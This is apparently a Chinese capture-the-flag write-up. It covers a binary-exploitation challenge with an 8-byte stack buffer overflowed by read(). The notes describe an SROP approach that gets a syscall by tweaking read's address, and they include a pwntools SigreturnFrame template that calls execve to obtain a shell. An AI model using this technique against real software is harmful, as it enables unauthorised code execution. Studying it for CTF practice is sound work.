# 考点
## 机器简单的代码
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[8]; // [rsp+4h] [rbp-Ch] BYREF

  read(0, buf, 0x1000uLL);
  return 15;
}
```
以往都是利用`add dword ptr [rbp - 0x3d], ebx ;`, 但是本题没有`pop rbx`,所以无法用这magic

## 看其他人wp
- 整体思路是SROP，但是没有syscall怎么办
- read的实现中有调用syscall,把0x50->0x98就可以了
![](https://r2.20161023.xyz/pic/20250922143009582.png)

### SROP模版
```
frame = SigreturnFrame()
frame.rdi = 0x4048f4
frame.rsi = 0
frame.rdx = 0
frame.rax = constants.SYS_execve
frame.rsp = syscall
frame.rip = ret
```

![](https://r2.20161023.xyz/pic/20250922160248110.png)


# getshell
![](https://r2.20161023.xyz/pic/20250921202934263.png)